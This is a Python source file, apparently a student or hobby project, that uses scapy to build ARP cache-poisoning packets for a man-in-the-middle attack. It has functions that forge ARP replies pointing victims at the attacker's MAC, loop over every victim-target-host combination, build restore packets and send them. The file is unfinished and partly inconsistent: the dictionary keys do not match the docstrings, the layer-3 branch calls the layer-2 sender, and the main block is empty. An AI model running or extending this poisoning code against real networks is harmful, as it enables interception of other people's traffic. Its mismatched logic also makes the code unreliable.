from scapy.all import *


def create_arp_packet(packet_information: dict):
    """
    Creates an arp packet based on the information present in dict
        :param packet_information: dict where information for the packet is stored
        dict requires at least 5 keys; 
        op : int
        psrc : str
        pdst : str
        hwsrc : str
        hwdst : str
    """

    # op = 2 sets the arp table
    # op = 1 requests arp information
    # hwsrc and hwdst = MAC address of src and dst
    # psrc and pdst = ip adress of src and dst
    # Set ipdst and macdst of target, such that arp_spoof reaches them
    # Set Ipsrc of victem to spoof
    # Set macsrc to yourself, such that you become the "server"
    arp_packet = ARP(
        op=packet_information["op"],
        psrc=packet_information["psrc"],
        pdst=packet_information["pdst"],
        hwsrc=packet_information["hwsrc"],
        hwdst=packet_information["hwdst"],
    )
    return arp_packet


def set_up_arp_packet(inf_victim: dict, inf_target: dict, inf_host: dict, poison: bool = False):
    """
    Set up the information for an arp packet, and creates the packet.
        :param inf_victim: dict with ip and mac of victim
        :param inf_target: dict with ip and mac of target of victim
        :param inf_host: dict with ip and mac of host
        :param poison: Decides wheter the packet is malicious or not
    """
    inf_packet: dict = {}
    # Set packet to set information
    inf_packet["op"] = 2
    inf_packet["psrc"] = inf_target["ip"]
    inf_packet["hwsrc"] = inf_target["mac"]
    inf_packet["pdst"] = inf_victim["pdst"]
    inf_packet["hwdst"] = inf_victim["hwdst"]
    if poison == True:
        inf_packet["hwsrc"] = inf_host["mac"]

    return create_arp_packet(inf_packet)


def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
    """
    Creates poisonous packets for all victims to all targets, with host as malicious actor
        :param victims: list of dicts with ip and mac of all victims
        :param targets: list of dicts with ip and mac of all targets
        :param hosts: list of dicts with ip and mac of all hosts
    """
    # Create return array for packets
    poison_packets: list = []
    for host in hosts:
        for victim in victims:
            for target in targets:
                # Check if all 3 are different
                if host != victim != target != host:
                    arp_poison_packet = set_up_arp_packet(
                        victim, target, host, poison=True)
                    poison_packets += [arp_poison_packet]
    return poison_packets


def restore_victims(victims: list[dict], targets: list[dict]):
    """
    Creates non-malicious packets for all victims to all targets, with host as malicious actor
        :param victims: list of dicts with ip and mac of all victims
        :param targets: list of dicts with ip and mac of all targets
    """
    # Create return array for packets
    restore_packets: list = []
    for victim in victims:
        for target in targets:
            if victim != target:
                arp_restore_packet = set_up_arp_packet(victim, target, {})
                restore_packets += [arp_restore_packet]
    return restore_packets


# send sends on layer 3, sendp sends at layer 2
# layer 2 and thus sendp requires more information
# extend this function to make use of send and sendp
# TODO a lot
def send_packet(packet, link_layer=3):
    """
    Sends a packet over layer
        :param packet: packet to sent
        :param link_layer: link_layer to send the packet over
    """
    if link_layer == 3:
        sendp(packet)
        return
    print("not implemented yet")


if __name__ == "__main__":
    # Assuming Information is gotten from ip discovery
    #
    pass
